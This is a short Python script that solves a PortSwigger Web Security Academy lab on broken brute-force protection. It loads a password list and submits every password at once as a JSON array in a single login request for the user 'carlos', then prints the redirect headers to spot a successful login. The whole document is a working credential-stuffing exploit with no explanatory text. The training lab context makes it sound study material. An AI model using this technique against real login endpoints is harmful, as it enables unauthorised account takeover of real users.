# https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

import requests
import json

with open('passwords.txt', 'r') as f:
    passwords = f.read().splitlines()

url = 'https://....web-security-academy.net/login'

login_body = json.dumps({"username": "carlos", "password": passwords})

r = requests.post(url=url, data=login_body)
print(r.history[0].headers)
